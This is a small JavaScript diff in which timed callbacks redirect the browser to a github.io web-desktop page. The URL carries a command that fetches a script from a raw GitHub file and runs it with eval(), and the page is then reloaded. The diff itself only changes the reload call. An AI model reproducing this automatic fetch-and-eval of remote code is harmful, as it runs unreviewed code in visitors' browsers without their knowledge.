@@ -94,7 +94,7 @@ setTimeout(() => {
                 }, 3000)
                 setTimeout(function() {
                     window.location.href = "https://ivorydevrimoalt.github.io/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/Billeroni.js').then(response => response.text()).then(script => eval(script));";
-                    window.location.reload();
+                    window.location.reload(true);
                 },6000)
             }, 2000);
         }, 3141);
